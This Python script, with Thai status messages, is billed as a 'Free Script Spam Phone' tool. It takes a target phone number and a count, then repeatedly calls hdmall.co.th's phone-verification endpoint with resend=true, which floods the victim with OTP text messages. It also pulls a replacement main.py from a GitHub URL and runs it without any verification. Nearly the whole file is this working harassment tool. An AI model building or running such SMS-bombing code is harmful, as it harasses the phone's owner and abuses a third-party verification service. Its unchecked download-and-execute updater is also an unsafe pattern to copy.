import os
import time
import threading
import urllib.request


version = "1.2"
api = "1"



try:
	os.system("clear")
	import colorama
	import lolpython
	import requests
	time.sleep(0.7)
	print("กำลังเช็คการติดตั้งโมดูล...")
	time.sleep(0.7)
	print("โมดูลที่จำเป็นถูกติดตั้งแล้ว...")
	time.sleep(1.5)
except ImportError:
	os.system("clear")
	time.sleep(0.7)
	print("กำลังเช็คการติดตั้งโมดูล...")
	time.sleep(0.7)
	print("ยังไม่ได้ติดตั้งโมดูลที่จำเป็น...")
	time.sleep(0.7)
	print("กำลังติดตั้งโมดูลอัตโนมัติ...")
	time.sleep(0.7)
	os.system("clear")
	os.system("pip3 install --upgrade pip && pip3 install lolpython && pip3 install colorama && pip3 install requests && python3 main.py")



def check_update2():
	os.system("clear")
	lol_py("Check Update...")
	time.sleep(1.5)
	check_update()
	
def check_update():
	try:
		if not is_up_to_date():
			os.system("clear")
			lol_py("   ┌──────────────────────────────────────────┐")
			lol_py("   │░█░░░▀█▀░█░░░▀▀█░█▀█░▀█▀░▀█▀░█░█░▀█▀░█▀█░░│")
			lol_py("   │░█░░░░█░░█░░░░░█░█░█░░█░░░█░░▄▀▄░░█░░█▀█░░│")
			lol_py("   │░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░░│")
			lol_py("   └──────────────────────────────────────────┘")
			lol_py("Have New Version Want To Update ?\nNew Update Version ==> " + get_latest_version())
			ww = str(input("(y/n) ==> : "))
			try:
				if ww.lower() in ['y','yes']:
					os.system("clear")
					lol_py("   ┌──────────────────────────────────────────┐")
					lol_py("   │░█░░░▀█▀░█░░░▀▀█░█▀█░▀█▀░▀█▀░█░█░▀█▀░█▀█░░│")
					lol_py("   │░█░░░░█░░█░░░░░█░█░█░░█░░░█░░▄▀▄░░█░░█▀█░░│")
					lol_py("   │░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░░│")
					lol_py("   └──────────────────────────────────────────┘")
					print("กำลังโหลดอัพเดท...")
					time.sleep(1.5)
					print("อัพเดทไฟล์เสร็จแล้ว...")
					time.sleep(1.5)
					download("main.py")
					os.system("clear && python3 main.py")
				elif ww.lower() in ['n','no']:
					os.system("clear")
					time.sleep(1.5)
					menu()
					
				else:
					os.system("clear")
					check_update()
			except:
				os.system("clear")
				check_update()
		else:
			menu()
	
	except:
		check_update()










def set_url(url_):
    global url; url = url_

def get_latest_version():
    file = urllib.request.urlopen(url)

    lines = ""
    for line in file:
        lines += line.decode("utf-8")

    return lines

def set_current_version(current_):
    global current; current = current_

def set_download_link(link):
    global download_link; download_link = link

def is_up_to_date():
    return version + "\n" == get_latest_version()

def download(path_to_file):
    urllib.request.urlretrieve(download_link,path_to_file)

set_download_link("https://raw.githubusercontent.com/ZeroN2/auto-update-test/main/main1.py")
set_url("https://raw.githubusercontent.com/ZeroN2/auto-update-test/main/.version")


from requests import post, Session
from colorama import Fore
from lolpython import lol_py 
import requests





def menu():
	try:
		os.system("clear")
		lol_py("   ┌──────────────────────────────────────────┐")
		lol_py("   │░█░░░▀█▀░█░░░▀▀█░█▀█░▀█▀░▀█▀░█░█░▀█▀░█▀█░░│")
		lol_py("   │░█░░░░█░░█░░░░░█░█░█░░█░░░█░░▄▀▄░░█░░█▀█░░│")
		lol_py("   │░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░░│")
		lol_py("   └──────────────────────────────────────────┘")
		print(Fore.RED + "")
		print("              Version Script : ",version)
		print("              Total Api : ",api)
		lol_py("              Free Script Spam Phone")
		print(Fore.RED + "")
		

		choice = input("1 ==> Spam Phone \n2 ==> Exit Script\n\nEnter Choice ==> ")
		choice = int(choice)
		
		if choice == 1:
			os.system("clear")
			time.sleep(1)
			print(Fore.RED + "")
			lol_py("   ┌──────────────────────────────────────────┐")
			lol_py("   │░█░░░▀█▀░█░░░▀▀█░█▀█░▀█▀░▀█▀░█░█░▀█▀░█▀█░░│")
			lol_py("   │░█░░░░█░░█░░░░░█░█░█░░█░░░█░░▄▀▄░░█░░█▀█░░│")
			lol_py("   │░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░░│")
			lol_py("   └──────────────────────────────────────────┘")
			print(Fore.RED + "              Version Script : ",version)
			print(Fore.RED + "              Total Api : ",api)
			print(Fore.RED + "              Free Script Spam Phone")
			print("")
			print("")
			phone = input("Phone : ")
			amount = input("Amount : ")
			start = input("Enter To Start...")
			os.system("clear")
			time.sleep(1)
			print(Fore.RED + "")
			lol_py("   ┌──────────────────────────────────────────┐")
			lol_py("   │░█░░░▀█▀░█░░░▀▀█░█▀█░▀█▀░▀█▀░█░█░▀█▀░█▀█░░│")
			lol_py("   │░█░░░░█░░█░░░░░█░█░█░░█░░░█░░▄▀▄░░█░░█▀█░░│")
			lol_py("   │░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░░│")
			lol_py("   └──────────────────────────────────────────┘")
			print(Fore.RED + "              Version Script : ",version)
			print(Fore.RED + "              Total Api : ",api)
			print(Fore.RED + "              Free Script Spam Phone")
			print("")
			print("")
			time.sleep(2)
			print(f"เบอร์ที่ยิง : {phone}\nยิงทั้งหมด : {amount} รอบ")
			time.sleep(1)
			
			
			
			def run(phone, amount):
				for _ in range(int(amount)):
					threading.Thread(target=spam1(phone)).start()
					
					
					
			def spam1(phone):
				url = f"https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true"
				r = requests.get(url)
				print("\rสถานะการร้องขอ api : ", r.status_code)
		
			start = run(phone, amount)
		
		
		elif choice == 2:
			os.system("clear")
			pass
			print("Close Script...")
			
			
			
		else:
			os.system("clear")
			menu()


	except:
		os.system("clear")
		menu()



check_update2()
